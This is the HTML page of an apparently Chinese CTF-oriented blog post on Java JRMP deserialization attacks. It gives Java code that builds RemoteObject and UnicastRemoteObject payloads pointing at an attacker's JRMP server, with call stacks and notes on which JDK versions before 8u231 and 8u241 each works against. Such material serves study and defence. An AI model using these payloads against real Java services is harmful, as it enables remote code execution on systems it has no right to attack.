@@ -1,0 +1,405 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-DT27XM4C8J"></script>
+    <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-DT27XM4C8J');
+    </script>
+    
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        unknown&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+
+<body id="bodyx">
+    <div class="hd logodiv" style="margin-top: 3%;">
+    <!-- <img src="/img/logo.png" class="logopng"> -->
+    <p class="logot">
+        <a href="/" style="color: #4f4646;text-decoration: none;">
+            unknown&#39;s blog 
+        </a>
+    </p>
+</div>
+<div class="hd">
+    <ol class="breadcrumb">
+        
+            <li><a class="ba" href="/tech">Tech</a></li>
+        
+            <li><a class="ba" href="/life">Life</a></li>
+        
+            <li><a class="ba" href="/essay">Essay</a></li>
+        
+            <li><a class="ba" href="/links">Friends</a></li>
+        
+            <li><a class="ba" target="_blank" rel="noopener" href="https://running.unk.org.cn/">Running</a></li>
+        
+            <li><a class="ba" href="/about">About</a></li>
+        
+            <li><a class="ba" href="/subscribe">Subscribe</a></li>
+        
+    </ol>
+    <hr class="breadcrumbhr">
+</div>
+
+    
+<div class="hd posts">
+
+    <!-- <a href="/index.html">
+        <i class="fa fa-reply replay-btn" aria-hidden="true"></i>
+    </a> -->
+    <div class="post-title">
+        <p>
+            JRMP反序列化
+        </p>
+        <!-- <hr> -->
+    </div>
+    <div class="post-content">
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>做题时遇到一题，打JRMP反序列化的，做了才发现先前的RMI反序列化学过，但没完全理清哈哈哈。</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/zpchcbd/p/14934168.html">https://www.cnblogs.com/zpchcbd/p/14934168.html</a></p>
+<p>先前说的RMI反序列化攻击，都是针对于RMI服务的（入口不是readObject，中间有readObject）。</p>
+<p>JRMP反序列化攻击，针对的是有可控反序列化点该怎么打（入口是readObject）。</p>
+<p>下面两个攻击手法，都是以readObject为入口，sink点为发送JRMP请求的攻击。根据JDK版本分了两种payload，这两种payload也分别对应RMI攻击中两种版本的绕过。</p>
+<h1 id="JDK8u231"><a href="#JDK8u231" class="headerlink" title="JDK8u231"></a>JDK8u231</h1><p>8u231之前都可以用这个。</p>
+<p>getObj填上JRMP服务器的地址。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private static RemoteObjectInvocationHandler getInvocationHandler(String host,int port) throws  Exception&#123;</span><br><span class="line">    ObjID id = new ObjID(1); // RMI registry</span><br><span class="line">    TCPEndpoint te = new TCPEndpoint(host, port);</span><br><span class="line">    UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));</span><br><span class="line">    return new RemoteObjectInvocationHandler(ref);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>调用栈与8u231之后的修复</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RemoteObject#readObject</span><br><span class="line">	UnicastRef#readExternal</span><br><span class="line">		LiveRef#read</span><br><span class="line">			DGCClient#registerRefs</span><br><span class="line">				DGCClient$EndpointEntry#registerRefs</span><br><span class="line">					DGCClient$EndpointEntry#makeDirtyCall</span><br><span class="line">						DGCImpl_Stub#dirty</span><br><span class="line">							// JDK8u231之后在这里添加了过滤器 StreamRemoteCall#setObjectInputFilter</span><br><span class="line">							UnicastRef#invoke</span><br><span class="line">								StreamRemoteCall#executeCall</span><br><span class="line">									//发起JRMP请求</span><br><span class="line">										readObject</span><br></pre></td></tr></table></figure>
+
+<p>其实不一定要用RemoteObjectInvocationHandler，RemoteObject的任意子类都可以，因为子类readObject时会先调用父类的readObject。</p>
+<p>比如用RegistryImpl一样可以：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception&#123;</span><br><span class="line">    ObjID id = new ObjID(1); // RMI registry</span><br><span class="line">    TCPEndpoint te = new TCPEndpoint(&quot;127.0.0.1&quot;, 17777);</span><br><span class="line">    UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));</span><br><span class="line">    RemoteObject registryImpl = Util.createWithoutConstructor(RegistryImpl.class);</span><br><span class="line">    Util.setFieldValue(registryImpl,&quot;ref&quot;,ref);</span><br><span class="line"></span><br><span class="line">    Util.unserialize(Util.serialize(registryImpl));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h1 id="JDK8u241"><a href="#JDK8u241" class="headerlink" title="JDK8u241"></a>JDK8u241</h1><p>8u241之前打这个。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private static RemoteObjectInvocationHandler getInvocationHandler(String host,int port) throws  Exception&#123;</span><br><span class="line">    ObjID id = new ObjID(1); // RMI registry</span><br><span class="line">    TCPEndpoint te = new TCPEndpoint(host, port);</span><br><span class="line">    UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));</span><br><span class="line">    return new RemoteObjectInvocationHandler(ref);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private static UnicastRemoteObject getUnicastRemoteObject(String host, int port) throws  Exception&#123;</span><br><span class="line">    LiveRef liveRef = new LiveRef(new ObjID(1), new TCPEndpoint(host,port), false);</span><br><span class="line">    UnicastRef ref = new UnicastRef(liveRef);</span><br><span class="line">    RemoteObjectInvocationHandler remoteObjectInvocationHandler = getInvocationHandler(host,port);</span><br><span class="line"></span><br><span class="line">    RMIServerSocketFactory rmiServerSocketFactory = (RMIServerSocketFactory) Proxy.newProxyInstance(RMIServerSocketFactory.class.getClassLoader(),</span><br><span class="line">            new Class[]&#123;RMIServerSocketFactory.class, Remote.class&#125;,remoteObjectInvocationHandler</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    UnicastRemoteObject unicastRemoteObject = Util.createWithoutConstructor(UnicastRemoteObject.class);</span><br><span class="line">    Util.setFieldValue(unicastRemoteObject,&quot;ref&quot;,ref);</span><br><span class="line">    Util.setFieldValue(unicastRemoteObject,&quot;ssf&quot;,rmiServerSocketFactory);</span><br><span class="line">    return unicastRemoteObject;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>调用栈与8u241之后的修复</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UnicastRemoteObject#readObject</span><br><span class="line">	reexport</span><br><span class="line">		...</span><br><span class="line">			TCPTransport#listen</span><br><span class="line">				TCPEndPoint#newServerSocket</span><br><span class="line">					RemoteObjectInvocationHandler#invoke</span><br><span class="line">						RemoteObjectInvocationHandler#invokeRemoteMethod</span><br><span class="line">							//修复位置在这里，下面走不通了</span><br><span class="line">								UnicastRef#invoke</span><br><span class="line">									StreamRemoteCall#executeCall</span><br><span class="line">										//发送JRMP请求，然后对返回结果readObject</span><br></pre></td></tr></table></figure>
+
+
+
+<p>其实这个payload 8u241之前包括8u231之前的所有版本都可以打。因为UnicastRemoteObject是RemoteObject的子类，会先调用RemoteObject的readObject，调用完他再调用UnicastRemoteObject的readObject。</p>
+
+    </div>
+    
+    <div class="toc-container">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JDK8u231"><span class="toc-text">JDK8u231</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JDK8u241"><span class="toc-text">JDK8u241</span></a></li></ol>
+    </div>
+
+    
+        <div id="custom-comments" class="custom-comments">
+    <h3>Comments</h3>
+    <form id="comment-form" class="comment-form">
+        <div class="form-row">
+            <input type="text" id="c-nickname" placeholder="Nickname *" required>
+            <input type="email" id="c-email" placeholder="Email">
+            <input type="url" id="c-website" placeholder="Website">
+        </div>
+        <textarea id="c-content" placeholder="Leave a comment..." required></textarea>
+        <button type="submit" id="c-submit">Submit</button>
+    </form>
+    <div id="comment-list" class="comment-list">
+        <!-- Comments will be loaded here -->
+        <p class="loading">Loading comments...</p>
+    </div>
+</div>
+
+<style>
+    .custom-comments {
+        margin-top: 40px;
+        border-top: 1px solid #eee;
+        padding-top: 20px;
+    }
+    .comment-form {
+        margin-bottom: 30px;
+    }
+    .comment-form .form-row {
+        display: flex;
+        gap: 10px;
+        margin-bottom: 10px;
+    }
+    .comment-form input, .comment-form textarea {
+        width: 100%;
+        padding: 8px;
+        border: 1px solid #ddd;
+        border-radius: 4px;
+        background: #f9f9f9;
+    }
+    .comment-form textarea {
+        height: 100px;
+        resize: vertical;
+        margin-bottom: 10px;
+    }
+    .comment-form button {
+        padding: 8px 20px;
+        background: #333;
+        color: #fff;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+    }
+    .comment-form button:hover {
+        background: #555;
+    }
+    .comment-item {
+        margin-bottom: 20px;
+        border-bottom: 1px solid #f0f0f0;
+        padding-bottom: 15px;
+    }
+    .comment-header {
+        margin-bottom: 5px;
+        font-size: 0.9em;
+        color: #666;
+    }
+    .comment-author {
+        font-weight: bold;
+        color: #333;
+        margin-right: 10px;
+    }
+    .comment-date {
+        font-size: 0.8em;
+        color: #999;
+    }
+    .comment-content {
+        line-height: 1.6;
+        color: #333;
+    }
+</style>
+
+<script>
+(function() {
+    const apiUrl = 'https://unk-blo-backend-rduuehbram.cn-shenzhen.fcapp.run';
+    const postUrl = window.location.pathname;
+    const commentList = document.getElementById('comment-list');
+    const commentForm = document.getElementById('comment-form');
+    const submitBtn = document.getElementById('c-submit');
+
+    function formatDate(timestamp) {
+        return new Date(timestamp).toLocaleString();
+    }
+
+    function escapeHtml(text) {
+        if (!text) return '';
+        return text
+            .replace(/&/g, "&amp;")
+            .replace(/</g, "&lt;")
+            .replace(/>/g, "&gt;")
+            .replace(/"/g, "&quot;")
+            .replace(/'/g, "&#039;");
+    }
+
+    // Load comments
+    fetch(`${apiUrl}/api/comments?url=${encodeURIComponent(postUrl)}`)
+        .then(response => response.json())
+        .then(data => {
+            commentList.innerHTML = '';
+            if (data.comments && data.comments.length > 0) {
+                data.comments.forEach(comment => {
+                    const div = document.createElement('div');
+                    div.className = 'comment-item';
+                    
+                    let authorHtml = `<span class="comment-author">${escapeHtml(comment.nickname)}</span>`;
+                    if (comment.website) {
+                        authorHtml = `<a href="${escapeHtml(comment.website)}" target="_blank" class="comment-author">${escapeHtml(comment.nickname)}</a>`;
+                    }
+
+                    div.innerHTML = `
+                        <div class="comment-header">
+                            ${authorHtml}
+                            <span class="comment-date">${formatDate(comment.timestamp)}</span>
+                        </div>
+                        <div class="comment-content">${escapeHtml(comment.content)}</div>
+                    `;
+                    commentList.appendChild(div);
+                });
+            } else {
+                commentList.innerHTML = '<p>No comments yet. Be the first!</p>';
+            }
+        })
+        .catch(err => {
+            console.error('Error loading comments:', err);
+            commentList.innerHTML = '<p>Error loading comments.</p>';
+        });
+
+    // Submit comment
+    commentForm.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const nickname = document.getElementById('c-nickname').value;
+        const email = document.getElementById('c-email').value;
+        const website = document.getElementById('c-website').value;
+        const content = document.getElementById('c-content').value;
+
+        submitBtn.disabled = true;
+        submitBtn.innerText = 'Submitting...';
+
+        fetch(`${apiUrl}/api/comment`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                post_url: postUrl,
+                nickname: nickname,
+                email: email,
+                website: website,
+                content: content
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.message) {
+                // Add new comment to list immediately
+                const div = document.createElement('div');
+                div.className = 'comment-item';
+                div.innerHTML = `
+                    <div class="comment-header">
+                        <span class="comment-author">${escapeHtml(nickname)}</span>
+                        <span class="comment-date">Just now</span>
+                    </div>
+                    <div class="comment-content">${escapeHtml(content)}</div>
+                `;
+                
+                // Insert at the beginning or append if empty
+                if (commentList.querySelector('.comment-item')) {
+                    commentList.insertBefore(div, commentList.firstChild);
+                } else {
+                    commentList.innerHTML = '';
+                    commentList.appendChild(div);
+                }
+                
+                commentForm.reset();
+            } else {
+                alert('Error: ' + (data.error || 'Unknown error'));
+            }
+        })
+        .catch(err => {
+            console.error('Error submitting comment:', err);
+            alert('Error submitting comment');
+        })
+        .finally(() => {
+            submitBtn.disabled = false;
+            submitBtn.innerText = 'Submit';
+        });
+    });
+})();
+</script>
+
+    
+
+
+</div>
+<script>
+    window.onload = ()=>{
+
+        document.title = document.querySelector('.post-title p').innerText;
+
+        var zoomImgs = function() {
+            const images = document.querySelectorAll('.post-content img'); // Only select images in post content
+            images.forEach(img => {
+                img.style.width = '70%'
+                img.style.height = 'auto'
+            });
+        }
+
+        zoomImgs()
+    }
+    
+</script>
+    
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 <a class="flink" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>-<a class="flink" target="_blank" rel="noopener" href="https://github.com/sanjinhub/hexo-theme-geek">Geek</a>.
+    </p>
+</div>
+
+<input type="hidden" id="valine_appid" value="diYBpeShV6s47KsfNez5JmBU-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="u3BEDbLDNridDApcAzJBWc9N">
+<input type="hidden" id="valine_enable" value="false">
+<input type="hidden" id="valine_placeholder" value="留下你的评论吧...">
+<input type="hidden" id="valine_avatar" value="hide">
+
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/js/lightbox.js"></script>
+
+
+
+<script>
+
+    var valine_appid = $("#valine_appid").val();
+    var valine_appKey = $("#valine_appKey").val();
+    var valine_enable = $("#valine_enable").val();
+    var valine_placeholder = $("#valine_placeholder").val();
+    var valine_avatar = $("#valine_avatar").val();
+
+    if(valine_enable == 'true'){
+        // Valine initialization code only if enabled
+        if (typeof Valine !== 'undefined') {
+            new Valine({
+                el: '#vcomments',
+                appId: valine_appid,
+                appKey: valine_appKey,
+                placeholder: valine_placeholder,
+                avatar: valine_avatar,
+            })
+        }
+    }
+
+</script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
